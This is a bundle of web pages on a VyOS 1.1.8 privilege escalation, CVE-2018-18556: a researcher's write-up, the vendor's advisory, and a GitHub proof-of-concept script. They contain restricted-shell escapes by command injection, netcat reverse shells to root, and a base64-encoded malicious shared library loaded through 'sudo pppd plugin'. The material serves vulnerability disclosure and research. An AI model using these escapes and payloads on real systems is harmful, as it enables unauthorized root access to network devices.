=== Content from blog.mirch.io_6ccdba36_20250126_055323.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2018-18556 – VyOS Privilege escalation via sudo pppd for operator users — November 5, 2018](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/ "CVE-2018-18556 – VyOS Privilege escalation via sudo pppd  for operator users")

## [CVE-2018-18556 – VyOS Privilege escalation via sudo pppd for operator users](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)

[November 5, 2018May 3, 2019](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/ "10:39 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Recently I found several ways to escape the restricted shell for an operator user in [VyOS](https://wiki.vyos.net/wiki/User_Guide) 1.1.8. VyOS is a Linux-based network operating system that provides software-based network routing, firewall, and VPN functionality. I plan to post information on the restricted shell escapes in the near future; For now read the [blog](http://blog.vyos.net/the-operator-level-is-proved-insecure-and-will-be-removed-in-the-next-releases) by [@dmbaturin](http://twitter.com/dmbaturin) detailing some of the methods.

This post will focus how root access was obtained using sudo after the restricted shell was escaped. One of my first post exploitation steps on Linux after a low privileged shell is obtained is to check if the user has sudo rules configured. Sudo is designed to limit privileges but often times it can be leveraged to elevate access.

First – let’s escape the restricted shell leveraging [CVE-2018-18555](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18555) and show that it’s a non-root user.

> user1@vyos> id
>
> Invalid command: [id]
>
> user1@vyos> telnet “127.0.0.1;/bin/bash”
>
> telnet: can’t connect to remote host (127.0.0.1): Connection refused
>
> user1@vyos> id
>
> uid=1001(user1) gid=100(users) groups=100(users),37(operator)
>
> Note: Some groups were omitted for formatting reasons

List the sudo rules with sudo -ll.  Note: output has been trimmed for brevity.

> user1@vyos> sudo -ll
>
> Matching Defaults entries for user1 on this host:
>
> env\_reset, syslog\_goodpri=info, env\_keep+=VYATTA\_\*
>
> User user1 may run the following commands on this host:
>
> Sudoers entry:
>
> RunAsUsers: root
>
> Commands:
>
> **/sbin/pppd**, /sbin/poff, /usr/sbin/pppstats

Every command listed should be reviewed. The man and info pages is a great resource to learn about a command. For pppd, the connect option caught my attention. It appears that you can pass an arbitrary command/script.

> **connect** script
>
> Usually there is something which needs to be done to prepare the link before the PPP protocol can be started; for instance, with a dial-up modem, commands need to be sent to the modem to dial the appropriate phone number. **This option specifies an command for pppd to execute (by passing it to a shell) before attempting to start PPP negotiation.** The chat (8) program is often useful here, as it provides a way to send arbitrary strings to a modem and respond to received characters. A value for this option from a privileged source cannot be overridden by a non-privileged user.

As a test I created a shell script with the id command. This worked but pppd spewed a bunch of non-printable characters back to the current session and did not release the terminal. I could have just as easily added commands to create a setuid shell or added a root account. There are endless possibilities but I wanted to see what other options to get an interactive shell.

> user1@vyos> echo “id >/dev/tty” > id.sh
>
> user1@vyos> chmod 755 id.sh
>
> user1@vyos> sudo /sbin/pppd connect $PWD/id.sh
>
> **uid=0(root) gid=0(root) groups=0(root)**
>
> ~�}#�!}!}!} }4}”}&} } } } }%}&���}’}”}(}”+}”~~�}#�!}!}!} }4}”}&} } } } }%}&���}’}”}(}”+}”~~�}#�!}!}!} }4}”}&} } } } }%}&���}’}”}(}”+}”~~�}#�!}!}!} }4}”}&} } } } }%}&���}’}”}(}”+}”~~�}#�!}!}!} }4}”}&} } } } }%}&���}’}”}

Because pppd does not release the terminal when executing the connect script there isn’t a clean way to get an interactive shell in the current terminal.  For this test I opened a second ssh session and started a netcat listener.

> user1@vyos> telnet “127.0.0.1;/bin/bash”
>
> telnet: can’t connect to remote host (127.0.0.1): Connection refused
>
> user1@vyos> netcat -v -l -p 9003
>
> listening on [any] 9003 …

Now pass netcat as the connect option to pppd. Fortunately the bundled netcat binary was compiled with the -e(exec) option enabled.

> user1@vyos> sudo pppd connect “netcat -e /bin/bash 127.0.0.1 9003”

Boom! A reverse root shell is received.

> connect to [127.0.0.1] from localhost [127.0.0.1] 32772
>
> id
>
> uid=0(root) gid=0(root) groups=0(root)

---

At this point I wanted to see what other pppd options might be vulnerable. Three other parameters also take an arbitrary script/command as an argument – disconnect, init, and welcome and can be leveraged using the same method. The “plugin” option also looked promising.

> **plugin** filename
>
> **Load the shared library object file filename as a plugin**. This is a privileged option. If file-name does not contain a slash (/), pppd will look in the /usr/lib/pppd/version directory for the plugin, where version is the version number of pppd (for example, 2.4.2).

Because a compiler is not installed on VyOS by default I used a CentOS 7 system and created a simple a shared library to execute /bin/sh when loaded. Once I had a working PoC I copied over the library to test it on the VyOS system.  Full PoC available at [CVE-2018-18556.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/VyOS/CVE-2018-18556.sh)

> user1@vyos> id
>
> uid=1001(user1) gid=100(users) groups=100(users),37(operator)
>
> user1@vyos> ./CVE-2018-18556.sh
>
> sh-4.1# id
>
> uid=0(root) gid=0(root) groups=0(root)
>
> sh-4.1#

Next steps:

* Submit a pull request to the [FallofSudo](https://github.com/Critical-Start/FallofSudo) project from [@paragonsec](https://twitter.com/paragonsec) to add the pppd command.
* Continue to review other sudo rules for VyOS operators.

### Share this:

* [Twitter](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Linux](https://blog.mirch.io/category/linux/)Tags: [sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)

## Post navigation

[CVE-2018-19788 PoC – polkit: Improper handling of user with uid > INT\_MAX leading to authentication bypass](https://blog.mirch.io/2018/12/09/cve-2018-19788-poc-polkit-improper-handling-of-user-with-uid-int_max-leading-to-authentication-bypass/)

### Leave a comment [Cancel reply](/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/#respond)

Δ

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* [Comment](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2018%252F11%252F05%252Fcve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2018%252F11%252F05%252Fcve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users%252F)
  + [Copy shortlink](https://wp.me/paoR5j-2r)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/151)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from github.com_fb9f092b_20250126_055315.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research%2Fblob%2Fmaster%2Fvulnerabilities%2FVyOS%2FCVE-2018-18556.sh)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research%2Fblob%2Fmaster%2Fvulnerabilities%2FVyOS%2FCVE-2018-18556.sh)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=mirchr%2Fsecurity-research)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mirchr](/mirchr)
/
**[security-research](/mirchr/security-research)**
Public

* [Notifications](/login?return_to=%2Fmirchr%2Fsecurity-research) You must be signed in to change notification settings
* [Fork
  27](/login?return_to=%2Fmirchr%2Fsecurity-research)
* [Star
   95](/login?return_to=%2Fmirchr%2Fsecurity-research)

* [Code](/mirchr/security-research)
* [Issues
  0](/mirchr/security-research/issues)
* [Pull requests
  0](/mirchr/security-research/pulls)
* [Actions](/mirchr/security-research/actions)
* [Projects
  0](/mirchr/security-research/projects)
* [Security](/mirchr/security-research/security)
* [Insights](/mirchr/security-research/pulse)

Additional navigation options

* [Code](/mirchr/security-research)
* [Issues](/mirchr/security-research/issues)
* [Pull requests](/mirchr/security-research/pulls)
* [Actions](/mirchr/security-research/actions)
* [Projects](/mirchr/security-research/projects)
* [Security](/mirchr/security-research/security)
* [Insights](/mirchr/security-research/pulse)

## Files

 master
## Breadcrumbs

1. [security-research](/mirchr/security-research/tree/master)
2. /[vulnerabilities](/mirchr/security-research/tree/master/vulnerabilities)
3. /[VyOS](/mirchr/security-research/tree/master/vulnerabilities/VyOS)
/
# CVE-2018-18556.sh

Copy path Blame  Blame
## Latest commit

## History

[History](/mirchr/security-research/commits/master/vulnerabilities/VyOS/CVE-2018-18556.sh)73 lines (69 loc) · 3.63 KB master
## Breadcrumbs

1. [security-research](/mirchr/security-research/tree/master)
2. /[vulnerabilities](/mirchr/security-research/tree/master/vulnerabilities)
3. /[VyOS](/mirchr/security-research/tree/master/vulnerabilities/VyOS)
/
# CVE-2018-18556.sh

Top
## File metadata and controls

* Code
* Blame

73 lines (69 loc) · 3.63 KB[Raw](https://github.com/mirchr/security-research/raw/refs/heads/master/vulnerabilities/VyOS/CVE-2018-18556.sh)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/bin/bash# Author: Rich Mirch# CVE: CVE-2018-18556# Description: Leverage the pppd plugin option to load a malicious shared library# to execute a shell as root when called by sudo as an operator user.### The following commands were used to create the base64 comrpressed library# blob. This was done because a compiler is not installed by default on# on VyOS 1.1.8##cat >woot.c<<EOF##include <stdlib.h>##include <sys/types.h>##include <unistd.h>##void woot(){# setreuid(0,0);# system("/bin/sh");#}##EOF###gcc -fPIC -o woot.o -Wall -c woot.c#gcc -Wall -shared -Wl,-soname,libwoot.so.1 -Wl,-init,woot -o libwoot.so.1 woot.o#gzip -c libwoot.so.1|base64
B64LIB=$(mktemp)
cat >${B64LIB?}<<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EOF
base64 -d ${B64LIB?} | gzip -cd > libwoot.so.1
sudo pppd plugin $PWD/libwoot.so.1

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_c35a42dc_20250125_041342.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from blog.vyos.io_52bb26a3_20250125_041344.html ===


* [VyOS Networks Blog](https://blog.vyos.io/)
* The "operator" level is proved insecure and will be removed in the next releases

# VyOS Networks Blog

Building an open source network OS for the people, together.

## The "operator" level is proved insecure and will be removed in the next releases

Daniil Baturin

Posted 1 Nov, 2018

The operator level in VyOS is a legacy feature that was inherited from the forked Vyatta Core code. It was always relatively obscure, and I don't think anyone really trusted its security, and for good reasons: with our current CLI architecture, real privilege separation is  impossible.

Security researcher Rich Mirch found multiple ways to escape the restricted shell and execute commands with root permissions for the operator level users. Most of those would take a lot of effort to fix, and it's not clear if some of those can be fixed at all. Since any new implementation of a privilege separation system will be incompatible with the old one, and leaving operator level in the system is best described as "security theater", in the next releases that feature will be removed and operator level users will be converted to admin level users.

We will use the "id" UNIX command for demonstration since it's harmless but is not supposed to be available for operator level users. Here are proofs of concept for all vulnerabilities reported by Rich:

### Restricted shell escape using the telnet command

Proof of concept:

```
user1@vyos> telnet "127.0.0.1;bash"

telnet: can't connect to remote host (127.0.0.1): Connection refused

# we are now in real, unrestricted bash

user1@vyos> id

uid=1001(user1) gid=100(users) groups=100(users),...

```

This problem could potentially be fixed, but since there's no way to introduce global input sanitation, every command would have to be checked and protected individually.

### Restricted shell escape using the "monitor command" command

The "monitor command" command allows operator level users to execute any command. Using it in combination with netcat it's possible to launch an unrestricted bash shell:

```
user1@vyos> monitor command "$(netcat -e /bin/bash 192.168.x.x 9003)"

Connection from 192.168.x.x:59952

id

uid=1001(user1) gid=100(users) groups=100(users),4(adm),30(dip),37(operator),102(quaggavty),105(vyattaop)

hostname

vyos

```
### Restricted shell escape using the traffic dump filters

```
user1@vyos> monitor interfaces ethernet eth0 traffic detail unlimited filter "-w /dev/null 2>/dev/null & bash"

Capturing traffic on eth0 ...

id

uid=1001(user1) gid=100(users) groups=100(users),4(adm),30(dip),37(operator),102(quaggavty),105(vyattaop)

```
### Restricted shell escape using backtick evaluation as a set command argument

```
user1@vyos> set "`/bin/bash`"

user1@vyos> id >/dev/tty

uid=1001(user1) gid=100(users) groups=100(users),4(adm),30(dip),37(operator),102(quaggavty),105(vyattaop)

```

This one is special because there may not be a way to fix it at all.

### Local privilege escalarion using pppd connection scripts

Operator level users are allowed to call pppd for the connect/disconnect commands. Since pppd is executed with root permissions, a malicious operator can execute arbitrary commands as root using a custom PPP connection script.

```
user1@vyos> echo "id >/dev/tty" > id.sh

user1@vyos> chmod 755 id.sh

Execute the id command as root using the sudo /sbin/pppd command.

user1@vyos> sudo /sbin/pppd connect $PWD/id.sh

uid=0(root) gid=0(root) groups=0(root)

```

The post categories:
[security](https://blog.vyos.io/tag/security)
[Uncategorized](https://blog.vyos.io/tag/uncategorized)

Share:

[Share via Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fblog.vyos.io%2Fthe-operator-level-is-proved-insecure-and-will-be-removed-in-the-next-releases)
[Share via Twitter](https://twitter.com/intent/tweet?url=https%3A%2F%2Fblog.vyos.io%2Fthe-operator-level-is-proved-insecure-and-will-be-removed-in-the-next-releases&text=The+%26quot%3Boperator%26quot%3B+level+is+proved+insecure+and+will+be+removed+in+the+next+releases)
Share via Email
[Share via LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fblog.vyos.io%2Fthe-operator-level-is-proved-insecure-and-will-be-removed-in-the-next-releases&title=The+%26quot%3Boperator%26quot%3B+level+is+proved+insecure+and+will+be+removed+in+the+next+releases&summary=The+%22operator%22+level+is+proved+insecure+and+will+be+removed+in+the+next+releases)

+
### Subscribe to our Blog

## Comments

+
### Subscribe Here!

## Blog Categories

[![](https://blog.vyos.io/hubfs/blog_images/rss.svg)
RSS Feed](https://blog.vyos.io/rss.xml)
![arrow](https://blog.vyos.io/hubfs/blog_images/arrow-bottom.svg)

* [279Uncategorized](https://blog.vyos.io/tag/uncategorized)
* [69announcement](https://blog.vyos.io/tag/announcement)
* [51release](https://blog.vyos.io/tag/release)
* [46vyos](https://blog.vyos.io/tag/vyos)
* [38security](https://blog.vyos.io/tag/security)
* [37project updates](https://blog.vyos.io/tag/project-updates)
* [341.2](https://blog.vyos.io/tag/1-2)
* [331.4](https://blog.vyos.io/tag/1-4)
* [33development](https://blog.vyos.io/tag/development)
* [30maintenance](https://blog.vyos.io/tag/maintenance)
* [281.3](https://blog.vyos.io/tag/1-3)
* [22news](https://blog.vyos.io/tag/news)
* [19release candidate](https://blog.vyos.io/tag/release-candidate)
* [15community](https://blog.vyos.io/tag/community)
* [15lts](https://blog.vyos.io/tag/lts)
* [15tutorial](https://blog.vyos.io/tag/tutorial)
* [141.5](https://blog.vyos.io/tag/1-5)
* [11aws](https://blog.vyos.io/tag/aws)
* [11documentation](https://blog.vyos.io/tag/documentation)
* [11epa](https://blog.vyos.io/tag/epa)
* [11ipsec](https://blog.vyos.io/tag/ipsec)
* [10announce](https://blog.vyos.io/tag/announce)
* [10update](https://blog.vyos.io/tag/update)
* [9commercial support](https://blog.vyos.io/tag/commercial-support)
* [9infrastructure](https://blog.vyos.io/tag/infrastructure)
* [9vyos 2.0](https://blog.vyos.io/tag/vyos-2-0)
* [8misc](https://blog.vyos.io/tag/misc)
* [8vpn](https://blog.vyos.io/tag/vpn)
* [8vyconf](https://blog.vyos.io/tag/vyconf)
* [7access subscriptions](https://blog.vyos.io/tag/access-subscriptions)
* [7bgp](https://blog.vyos.io/tag/bgp)
* [7cloud](https://blog.vyos.io/tag/cloud)
* [7commercial services](https://blog.vyos.io/tag/commercial-services)
* [7downtime](https://blog.vyos.io/tag/downtime)
* [6Maintenance Notification](https://blog.vyos.io/tag/maintenance-notification)
* [6openvpn](https://blog.vyos.io/tag/openvpn)
* [5azure](https://blog.vyos.io/tag/azure)
* [5cli](https://blog.vyos.io/tag/cli)
* [5firewall](https://blog.vyos.io/tag/firewall)
* [5hardware](https://blog.vyos.io/tag/hardware)
* [5vyos project](https://blog.vyos.io/tag/vyos-project)
* [4bug](https://blog.vyos.io/tag/bug)
* [4crux](https://blog.vyos.io/tag/crux)
* [4holiday](https://blog.vyos.io/tag/holiday)
* [4mirror](https://blog.vyos.io/tag/mirror)
* [4rolling release](https://blog.vyos.io/tag/rolling-release)
* [4vulnerability](https://blog.vyos.io/tag/vulnerability)
* [3api](https://blog.vyos.io/tag/api)
* [3beta](https://blog.vyos.io/tag/beta)
* [3conference](https://blog.vyos.io/tag/conference)
* [3contributors](https://blog.vyos.io/tag/contributors)
* [3donations](https://blog.vyos.io/tag/donations)
* [3frr](https://blog.vyos.io/tag/frr)
* [3gre](https://blog.vyos.io/tag/gre)
* [3meeting](https://blog.vyos.io/tag/meeting)
* [3microsoft](https://blog.vyos.io/tag/microsoft)
* [3nat](https://blog.vyos.io/tag/nat)
* [3offtopic](https://blog.vyos.io/tag/offtopic)
* [3open-source](https://blog.vyos.io/tag/open-source)
* [3poll](https://blog.vyos.io/tag/poll)
* [3qos](https://blog.vyos.io/tag/qos)
* [3scripting](https://blog.vyos.io/tag/scripting)
* [3vyos foundation](https://blog.vyos.io/tag/vyos-foundation)
* [2SeasonOfDocs](https://blog.vyos.io/tag/seasonofdocs)
* [2amazon](https://blog.vyos.io/tag/amazon)
* [2automation](https://blog.vyos.io/tag/automation)
* [2bigthanks](https://blog.vyos.io/tag/bigthanks)
* [2certifications](https://blog.vyos.io/tag/certifications)
* [2changes](https://blog.vyos.io/tag/changes)
* [2dns](https://blog.vyos.io/tag/dns)
* [2edgecore](https://blog.vyos.io/tag/edgecore)
* [2equuleus](https://blog.vyos.io/tag/equuleus)
* [2future](https://blog.vyos.io/tag/future)
* [2governance](https://blog.vyos.io/tag/governance)
* [2high availability](https://blog.vyos.io/tag/high-availability)
* [2ids](https://blog.vyos.io/tag/ids)
* [2ipoe](https://blog.vyos.io/tag/ipoe)
* [2ipv6](https://blog.vyos.io/tag/ipv6)
* [2is-is](https://blog.vyos.io/tag/is-is)
* [2lanner](https://blog.vyos.io/tag/lanner)
* [2live stream](https://blog.vyos.io/tag/live-stream)
* [2macsec](https://blog.vyos.io/tag/macsec)
* [2migration scripts](https://blog.vyos.io/tag/migration-scripts)
* [2notification](https://blog.vyos.io/tag/notification)
* [2nutanix](https://blog.vyos.io/tag/nutanix)
* [2outage](https://blog.vyos.io/tag/outage)
* [2ova](https://blog.vyos.io/tag/ova)
* [2portal](https://blog.vyos.io/tag/portal)
* [2project insights](https://blog.vyos.io/tag/project-insights)
* [2sentrium](https://blog.vyos.io/tag/sentrium)
* [2snmp](https://blog.vyos.io/tag/snmp)
